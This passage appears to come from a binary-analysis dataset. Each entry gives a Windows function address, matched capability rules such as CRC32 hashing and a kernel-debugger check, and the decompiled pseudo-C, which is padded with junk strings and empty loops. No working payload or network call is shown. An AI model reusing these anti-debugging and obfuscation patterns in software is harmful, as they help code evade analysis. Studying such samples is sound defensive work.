       do {\n            for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n            }\n            if (var_8h == 1) {\n                iVar7 = var_ch + (pcVar11 & 0xfffffffe);\n                *(ppiVar13 + iVar6) = iVar7;\n                iVar7 = fcn.00403977(iVar7, var_10h - pcVar11 >> 1, *ppiVar13);\n                if (iVar7 != 0) goto code_r0x004becc2;\n            }\n            piVar9 = *ppiVar13;\n            piVar1 = piVar9 + 1;\n            do {\n                iVar3 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar3 != 0);\n            ppiVar13 = ppiVar13 + 1;\n            pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2;\n            var_18h = var_18h + 1;\n        } while (var_18h < 2);\n        for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n        }\n        if (var_8h == 1) {\n            iVar6 = var_ch + (pcVar11 & 0xfffffffe);\n            *(var_ch + 0x154) = iVar6;\n            iVar6 = fcn.00403977(iVar6, var_10h - pcVar11 >> 1, ppcVar4[0x55]);\n            if (iVar6 != 0) goto code_r0x004becc2;\n        }\n        piVar9 = ppcVar4[0x55];\n        piVar1 = piVar9 + 1;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        for (pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n        }\n        if (var_8h == 1) {\n            iVar6 = var_ch + (pcVar11 & 0xfffffffe);\n            *(var_ch + 0x158) = iVar6;\n            iVar6 = fcn.00403977(iVar6, var_10h - pcVar11 >> 1, ppcVar4[0x56]);\n            if (iVar6 != 0) goto code_r0x004becc2;\n        }\n        piVar9 = ppcVar4[0x56];\n        piVar1 = piVar9 + 1;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        for (pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n        }\n        if (var_8h == 1) {\n            iVar6 = var_ch + (pcVar11 & 0xfffffffe);\n            *(var_ch + 0x15c) = iVar6;\n            iVar6 = fcn.00403977(iVar6, var_10h - pcVar11 >> 1, ppcVar4[0x57]);\n            if (iVar6 != 0) goto code_r0x004becc2;\n        }\n        piVar9 = ppcVar4[0x57];\n        piVar1 = piVar9 + 1;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        for (pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n        }\n        if (var_8h == 1) {\n            iVar6 = var_ch + (pcVar11 & 0xfffffffe);\n            *(var_ch + 0x160) = iVar6;\n            iVar6 = fcn.00403977(iVar6, var_10h - pcVar11 >> 1, ppcVar4[0x58]);\n            if (iVar6 != 0) {\ncode_r0x004becc2:\n                fcn.0040366b(0, 0, 0, 0, 0);\n                pcVar5 = swi(3);\n                iVar6 = (*pcVar5)();\n                return iVar6;\n            }\n        }\n        piVar9 = ppcVar4[0x58];\n        piVar1 = piVar9 + 1;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        var_8h = var_8h + 1;\n        pcVar11 = pcVar11 + ((piVar9 - piVar1 >> 1) + 1) * 2;\n    } while (var_8h < 2);\n    if (var_1ch != '\\0') {\n        *(var_28h + 0x350) = *(var_28h + 0x350) & 0xfffffffd;\n    }\n    return var_ch;\n}\n",
        "token_count": 4448
    },
    "0040262b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.0040262b(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack188;\n    int32_t iStack184;\n    uchar auStack180 [24];\n    uchar auStack156 [24];\n    int32_t iStack132;\n    ulong uStack128;\n    uint uStack120;\n    uchar uStack113;\n    ulong uStack112;\n    ulong uStack104;\n    uint uStack72;\n    uchar uStack65;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff28;\n    uStack28 = 0x450480;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 1;\n    fcn.00401e79(\"bbdej\");\n    uStack65 = 1;\n    uStack72 = 0x7e0;\n    uStack24 = 2;\n    fcn.00401e79(\"oqpwbailmyzioqltpjpfouvgltefiqdle\");\n    uStack104 = *0x546cc8;\n    uStack112 = *0x546cb8;\n    uStack113 = 0;\n    uStack120 = 0x1622;\n    uStack128 = *0x546ca8;\n    for (iStack132 = 0x21; 0 < iStack132; iStack132 = iStack132 + -1) {\n    }\n    uStack24 = 3;\n    fcn.00401e79(\"bbdej\");\n    uStack24 = 4;\n    fcn.00401e79(\"bbdej\");\n    uVar1 = fcn.004042dc(auStack180, auStack156);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack184 = 5; 0 < iStack184; iStack184 = iStack184 + -1) {\n        }\n    }\n    for (iStack188 = 0x52; 0 < iStack188; iStack188 = iStack188 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 1;\n}\n",
        "token_count": 585
    },
    "004026c6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.004026c6(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack24 = 0xffffffff;\n    uStack28 = 0x450e20;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    fcn.00401e79(\"fglfydjmguyuexkwscsuunwdbzkggjdlnbkxofmwqwonmxvbawzppqpckprkensqjrelhyvyyklcobtpnpxh\");\n    uStack24 = 0;\n    fcn.00401e79(\"lmogmtiiaqxmr\");\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 229
    },
    "00402702": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402702(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack204;\n    uchar auStack200 [24];\n    uchar auStack176 [24];\n    int32_t iStack152;\n    uint uStack148;\n    uint uStack96;\n    uint uStack92;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar uStack69;\n    uint uStack68;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff18;\n    uStack28 = 0x450fe0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 0;\n    fcn.00401e79(\"braxbbcvtgohypuevcahskjdwsgtqwjgblbaongpdzjvpknjjepmxvwrdctfrygloaddmzsrvy\");\n    uStack68 = 0xf75;\n    uStack69 = 0;\n    uStack76 = 0x40e125c0;\n    uStack80 = 0;\n    uStack84 = 0x885;\n    uStack92 = 0x40e2e920;\n    uStack96 = 0;\n    uStack24 = 1;\n    fcn.00401e79(\"xdwebyvvdkbnqakmsfzenvvbqbboiuvkwiyaaiaeylgbxcvrot\");\n    uStack24 = 2;\n    fcn.00401e79(\"mbtjoqgrdomaormywqjkjsgtonvgrffnqzbixwatktbtdknuspiyqbugkoyklntxhdkyqvyvspzbxbijgn\");\n    uStack148 = 0x2626;\n    for (iStack152 = 0x4b; 0 < iStack152; iStack152 = iStack152 + -1) {\n    }\n    uStack24 = 3;\n    fcn.00401e79(\"xdwebyvvdkbnqakmsfzenvvbqbboiuvkwiyaaiaeylgbxcvrot\");\n    uStack24 = 4;\n    fcn.00401e79(\"xdwebyvvdkbnqakmsfzenvvbqbboiuvkwiyaaiaeylgbxcvrot\");\n    uVar1 = fcn.00405b37(auStack200, auStack176);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack204 = 0x4b; 0 < iStack204; iStack204 = iStack204 + -1) {\n        }\n    }\n    uStack24 = 3;\n    fcn.00401e79(\"btepmfszb\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 764
    },
    "004027d9": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_dh\n\nvoid __cdecl fcn.004027d9(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t in_ECX;\n    uint32_t uVar1;\n    uint var_14h;\n    uint var_dh;\n    \n    uVar1 = 4;\n    if (*(in_ECX + 0x38) != 0) {\n        uVar1 = 0;\n    }\n    fcn.00403350(arg_8h | uVar1, arg_ch & 1);\n    return;\n}\n",
        "token_count": 130
    },
    "00402829": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nuint __cdecl fcn.00402829(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t lpCriticalSection;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004022de(0x56f968, 0x10);\n    lpCriticalSection = *(unaff_EBP + 8);\n    if (lpCriticalSection == 0xfffffffe) {\n        puVar1 = fcn.0040185c();\n        *puVar1 = 0;\n        puVar1 = fcn.00403a35();\n        *puVar1 = 9;\n    }\n    else {\n        if ((lpCriticalSection < 0) || (*0x575488 <= lpCriticalSection)) {\ncode_r0x004d36fc:\n            puVar1 = fcn.0040185c();\n            *puVar1 = 0;\n            puVar1 = fcn.00403a35();\n            *puVar1 = 9;\n        }\n        else {\n            iVar3 = (lpCriticalSection & 0x3f) * 0x38;\n            *(unaff_EBP + -0x20) = iVar3;\n            if ((*(iVar3 + 0x28 + *((lpCriticalSection >> 6) * 4 + 0x575220)) & 1) == 0) goto code_r0x004d36fc;\n            if (*(unaff_EBP + 0x10) < 0x80000000) {\n                fcn.0040150a(lpCriticalSection);\n                uVar2 = 0xffffffff;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n                *(unaff_EBP + -4) = 0;\n                if ((*(*(unaff_EBP + -0x20) + 0x28 + *((lpCriticalSection >> 6) * 4 + 0x575220)) & 1) == 0) {\n                    puVar1 = fcn.00403a35();\n                    *puVar1 = 9;\n                    puVar1 = fcn.0040185c();\n                    *puVar1 = 0;\n                }\n                else {\n                    uVar2 = fcn.0040628a(lpCriticalSection, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar2;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.004d36f4();\n                goto code_r0x004d3717;\n            }\n            puVar1 = fcn.0040185c();\n            *puVar1 = 0;\n            puVar1 = fcn.00403a35();\n            *puVar1 = 0x16;\n        }\n        fcn.004037ce();\n    }\n    uVar2 = 0xffffffff;\ncode_r0x004d3717:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar2;\n}\n",
        "token_count": 749
    },
    "004028d8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nbool __fastcall fcn.004028d8(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return 0xf < *(param_1 + 0x14);\n}\n",
        "token_count": 44
    },
    "00402914": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402914(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    int32_t var_124h;\n    uint var_120h;\n    uint var_108h;\n    int32_t var_f0h;\n    uint var_ech;\n    uint var_d4h;\n    int32_t var_bch;\n    uint var_b8h;\n    uint var_a0h;\n    int32_t var_88h;\n    uint var_84h;\n    uint var_6ch;\n    uint var_54h;\n    uint var_3ch;\n    uchar var_22h;\n    uchar var_21h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xfffffec0;\n    var_14h = 0x450500;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_21h = 0;\n    var_22h = 0;\n    var_10h = 0;\n    fcn.00401e79(\"wckluhwnyatjvopqptcgwzejsumjtdimavtxouou\");\n    var_10h = 1;\n    fcn.00401e79(\"djrqfxgsheexlcny\");\n    var_10h = 2;\n    fcn.00401e79(\"wckluhwnyatjvopqptcgwzejsumjtdimavtxouou\");\n    var_10h = 6;\n    fcn.00401e79(\"wckluhwnyatjvopqptcgwzejsumjtdimavtxouou\");\n    uVar1 = fcn.004042dc(&var_84h, &var_6ch);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_88h = 0x49; 0 < var_88h; var_88h = var_88h + -1) {\n        }\n    }\n    var_10h = 2;\n    fcn.00401e79(\"wckluhwnyatjvopqptcgwzejsumjtdimavtxouou\");\n    var_10h = 5;\n    fcn.00401e79(\"wckluhwnyatjvopqptcgwzejsumjtdimavtxouou\");\n    uVar1 = fcn.004042dc(&var_b8h, &var_a0h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_bch = 6; 0 < var_bch; var_bch = var_bch + -1) {\n        }\n    }\n    var_10h = 2;\n    fcn.00401e79(\"djrqfxgsheexlcny\");\n    var_10h = 4;\n    fcn.00401e79(\"djrqfxgsheexlcny\");\n    uVar1 = fcn.00405b37(&var_ech, &var_d4h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_f0h = 0x44; 0 < var_f0h; var_f0h = var_f0h + -1) {\n        }\n    }\n    var_10h = 2;\n    fcn.00401e79(\"djrqfxgsheexlcny\");\n    var_10h = 3;\n    fcn.00401e79(\"djrqfxgsheexlcny\");\n    uVar1 = fcn.004042dc(&var_120h, &var_108h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_124h = 0x2f; 0 < var_124h; var_124h = var_124h + -1) {\n        }\n    }\n    var_10h = 2;\n    fcn.00401e79(\"dkprgn\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return arg_8h;\n}\n",
        "token_count": 1076
    },
    "0040292d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040292d(uint arg_8h)\n\n{\n    int32_t iStack56;\n    \n    for (iStack56 = 0x19; 0 < iStack56; iStack56 = iStack56 + -1) {\n    }\n    fcn.00403b02();\n    return 1;\n}\n",
        "token_count": 75
    },
    "0040297d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 __cdecl fcn.0040297d(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack244;\n    uchar auStack240 [24];\n    uchar auStack216 [24];\n    int32_t iStack192;\n    int32_t iStack188;\n    uchar auStack184 [24];\n    uchar auStack160 [24];\n    uint uStack136;\n    uchar uStack129;\n    uint uStack128;\n    uint uStack124;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xfffffef0;\n    uStack28 = 0x4507e0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 2;\n    fcn.00401e79(\"xqxvnmaocjwxmwwpaznlkyxyynd\");\n    uStack68 = 0x40dddb80;\n    uStack72 = 0;\n    uStack24 = 3;\n    fcn.00401e79(\"posemjjthhvcaruhhzmdeqvqhiueespjnwfprxfdlqlttepyjwqhlomkeqsqfoixvtqaqwvcmpijsgaberswew\");\n    uStack24 = 4;\n    fcn.00401e79(\"ensdrspvfrvincegekchfzmkqrebhxizsdymthkpwjgytqvjdgdgtukuoika\");\n    uStack124 = 0x40ccb680;\n    uStack128 = 0;\n    uStack129 = 1;\n    uStack136 = 0x48;\n    uStack24 = 5;\n    fcn.00401e79(\"ensdrspvfrvincegekchfzmkqrebhxizsdymthkpwjgytqvjdgdgtukuoika\");\n    uStack24 = 7;\n    fcn.00401e79(\"ensdrspvfrvincegekchfzmkqrebhxizsdymthkpwjgytqvjdgdgtukuoika\");\n    uVar1 = fcn.004042dc(auStack184, auStack160);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack188 = 0x42; 0 < iStack188; iStack188 = iStack188 + -1) {\n        }\n    }\n    for (iStack192 = 0x37; 0 < iStack192; iStack192 = iStack192 + -1) {\n    }\n    uStack24 = 5;\n    fcn.00401e79(\"posemjjthhvcaruhhzmdeqvqhiueespjnwfprxfdlqlttepyjwqhlomkeqsqfoixvtqaqwvcmpijsgaberswew\");\n    uStack24 = 6;\n    fcn.00401e79(\"posemjjthhvcaruhhzmdeqvqhiueespjnwfprxfdlqlttepyjwqhlomkeqsqfoixvtqaqwvcmpijsgaberswew\");\n    uVar1 = fcn.00405b37(auStack240, auStack216);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack244 = 0x3b; 0 < iStack244; iStack244 = iStack244 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x546e54;\n}\n",
        "token_count": 933
    },
    "00402987": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402987(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack184;\n    int32_t iStack180;\n    int32_t iStack176;\n    uchar auStack172 [24];\n    uchar auStack148 [24];\n    uint uStack124;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack52;\n    uint uStack48;\n    uchar uStack41;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff28;\n    uStack28 = 0x450e80;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack41 = 0;\n    uStack48 = 0x551;\n    uStack52 = 0x40e;\n    uStack60 = 0x40c1cf80;\n    uStack64 = 0;\n    uStack68 = 0x40a91600;\n    uStack72 = 0;\n    uStack24 = 1;\n    fcn.00401e79(\"ggqzuprkwjmsemirnwlmvalvfdsynyusyzfyxiirg\");\n    uStack24 = 2;\n    fcn.00401e79(\"cqdbptctcomsddmaippazevrknxolhhrwjeophlumobgybsktbvviumzvf\");\n    uStack124 = 0x2b9;\n    uStack24 = 3;\n    fcn.00401e79(\"ggqzuprkwjmsemirnwlmvalvfdsynyusyzfyxiirg\");\n    uStack24 = 4;\n    fcn.00401e79(\"ggqzuprkwjmsemirnwlmvalvfdsynyusyzfyxiirg\");\n    uVar1 = fcn.00405b37(auStack172, auStack148);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack176 = 0x61; 0 < iStack176; iStack176 = iStack176 + -1) {\n        }\n    }\n    for (iStack180 = 0x45; 0 < iStack180; iStack180 = iStack180 + -1) {\n    }\n    for (iStack184 = 0x35; 0 < iStack184; iStack184 = iStack184 + -1) {\n    }\n    uStack24 = 3;\n    fcn.00401e79(\"tkwtxkcyrq\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 712
    },
    "004029cd": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.004029cd(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack184;\n    int32_t iStack180;\n    int32_t iStack176;\n    uchar auStack172 [24];\n    uchar auStack148 [24];\n    int32_t iStack124;\n    int32_t iStack120;\n    uint uStack116;\n    ulong uStack112;\n    ulong uStack104;\n    uchar uStack89;\n    ulong uStack88;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff30;\n    uStack28 = 0x451200;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x40e4aac0;\n    uStack48 = 0;\n    uStack52 = 0x40f076b0;\n    uStack56 = 0;\n    uStack24 = 0;\n    fcn.00401e79(\"foaravoilasgntggrlkzgwrtblqyqtidqibeujrkkmtgcfcufdkcnwgfopidvkzv\");\n    uStack88 = *0x5471d8;\n    uStack89 = 1;\n    uStack104 = *0x5471c8;\n    uStack112 = *0x5471b8;\n    uStack116 = 0xaa7;\n    for (iStack120 = 0x57; 0 < iStack120; iStack120 = iStack120 + -1) {\n    }\n    for (iStack124 = 0; 0 < iStack124; iStack124 = iStack124 + -1) {\n    }\n    uStack24 = 1;\n    fcn.00401e79(\"foaravoilasgntggrlkzgwrtblqyqtidqibeujrkkmtgcfcufdkcnwgfopidvkzv\");\n    uStack24 = 2;\n    fcn.00401e79(\"foaravoilasgntggrlkzgwrtblqyqtidqibeujrkkmtgcfcufdkcnwgfopidvkzv\");\n    uVar1 = fcn.00405b37(auStack172, auStack148);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack176 = 0x34; 0 < iStack176; iStack176 = iStack176 + -1) {\n        }\n    }\n    for (iStack180 = 0x57; 0 < iStack180; iStack180 = iStack180 + -1) {\n    }\n    for (iStack184 = 0x46; 0 < iStack184; iStack184 = iStack184 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 1;\n}\n",
        "token_count": 751
    },
    "004029f0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.004029f0(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack316;\n    uchar auStack312 [24];\n    uchar auStack288 [24];\n    int32_t iStack264;\n    int32_t iStack260;\n    uchar auStack256 [24];\n    uchar auStack232 [24];\n    int32_t iStack208;\n    uchar auStack204 [24];\n    uchar auStack180 [24];\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack68;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xfffffeb0;\n    uStack28 = 0x451520;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 0;\n    fcn.00401e79(\"ewjjsrrwutbfejhehxsqpkdooibjglyihwbdtxn\");\n    uStack68 = 0x1532;\n    uStack24 = 1;\n    fcn.00401e79(\"vpfvdkijhtifxbcqhafbkmfqzonvlpubfuntxxaklnnfbiitlfjiipeypeokhtvhtqiczkpbppcxrkwnnoizsnulytadgh\");\n    uStack24 = 2;\n    fcn.00401e79(\"zzqfiwgrhanir\");\n    uStack24 = 3;\n    fcn.00401e79(\"dxqrwqjoilerwsfvncuamtwvdnrifvrbxyiwduiwiioohotv\");\n    uStack144 = 0xd7;\n    uStack148 = 0x40dc4600;\n    uStack152 = 0;\n    uStack156 = 0xe05;\n    uStack24 = 4;\n    fcn.00401e79(\"dxqrwqjoilerwsfvncuamtwvdnrifvrbxyiwduiwiioohotv\");\n    uStack24 = 7;\n    fcn.00401e79(\"dxqrwqjoilerwsfvncuamtwvdnrifvrbxyiwduiwiioohotv\");\n    uVar1 = fcn.004042dc(auStack204, auStack180);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack208 = 0x24; 0 < iStack208; iStack208 = iStack208 + -1) {\n        }\n    }\n    uStack24 = 4;\n    fcn.00401e79(\"dxqrwqjoilerwsfvncuamtwvdnrifvrbxyiwduiwiioohotv\");\n    uStack24 = 6;\n    fcn.00401e79(\"dxqrwqjoilerwsfvncuamtwvdnrifvrbxyiwduiwiioohotv\");\n    uVar1 = fcn.00405b37(auStack256, auStack232);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack260 = 0x5f; 0 < iStack260; iStack260 = iStack260 + -1) {\n        }\n    }\n    for (iStack264 = 0x4f; 0 < iStack264; iStack264 = iStack264 + -1) {\n    }\n    uStack24 = 4;\n    fcn.00401e79(\"ewjjsrrwutbfejhehxsqpkdooibjglyihwbdtxn\");\n    uStack24 = 5;\n    fcn.00401e79(\"ewjjsrrwutbfejhehxsqpkdooibjglyihwbdtxn\");\n    uVar1 = fcn.004042dc(auStack312, auStack288);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack316 = 0x5e; 0 < iStack316; iStack316 = iStack316 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0;\n}\n",
        "token_count": 1082
    },
    "00402a0e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402a0e(uint *param_1)\n\n{\n    uint32_t uVar1;\n    uint var_14h;\n    uchar var_dh;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    var_4h = param_1;\n    fcn.00401b09();\n    uVar1 = fcn.004028d8();\n    if ((uVar1 & 1) != 0) {\n        var_8h = *param_1;\n        var_ch = fcn.0040407a();\n        fcn.004034d1(param_1);\n        fcn.0040123a(var_8h, param_1[5] + 1);\n    }\n    param_1[4] = 0;\n    param_1[5] = 0xf;\n    var_dh = 0;\n    fcn.00405e0c(param_1, &var_dh);\n    return;\n}\n",
        "token_count": 221
    },
    "00402a31": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
